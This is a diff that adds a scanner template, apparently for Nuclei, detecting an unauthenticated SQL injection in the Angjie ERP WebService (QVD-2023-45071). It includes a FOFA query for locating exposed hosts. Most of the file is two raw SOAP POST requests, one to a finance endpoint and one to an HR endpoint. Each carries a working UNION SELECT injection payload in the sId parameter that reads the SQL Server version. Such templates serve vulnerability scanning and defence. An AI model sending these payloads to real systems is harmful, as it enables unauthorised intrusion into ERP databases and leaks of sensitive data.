@@ -1,0 +1,49 @@
+id: enjoyit-WebService-sqli
+info:
+  name: 昂捷 ERP WebService - sql 注入 (QVD-2023-45071)
+  author: leadlife
+  severity: high
+  description: 昂捷 ERP WebService 接口 存在 SQL 注入漏洞，未经身份验证的攻击者可以利用该漏洞泄露系统敏感信息。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E6%98%82%E6%8D%B7ERP/%E6%98%82%E6%8D%B7ERP%20WebService%E6%8E%A5%E5%8F%A3%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(QVD-2023-45071).md
+  metadata:
+    verified: true
+    fofa-query: body="CheckSilverlightInstalled"
+  tags: 2023,enjoyit,sqli
+
+http:
+  - raw:
+      - |
+        POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 482
+        SOAPAction: http://tempuri.org/GetOSpById
+
+        <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetOSpById xmlns="http://tempuri.org/"><sId>string' UNION SELECT NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YQmj</sId></GetOSpById></soap:Body></soap:Envelope>
+
+    matchers:
+      - type: dsl
+        name: CWSFinanceCommon_endpoints
+        dsl:
+          - status_code == 200
+          - contains(body,'Microsoft SQL')
+        condition: and
+    
+  - raw:
+      - |
+        POST /EnjoyRMIS_WS/WS/Hr/CWSHr.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 482
+        SOAPAction: "http://tempuri.org/GetOSpById"
+
+        <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetOSpById xmlns="http://tempuri.org/"><sId>string' UNION SELECT NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YQmj</sId></GetOSpById></soap:Body></soap:Envelope>
+    
+    matchers:
+      - type: dsl
+        name: CWSHr_endpoint
+        dsl:
+          - status_code == 200
+          - contains(body,'Microsoft SQL')
+        condition: and
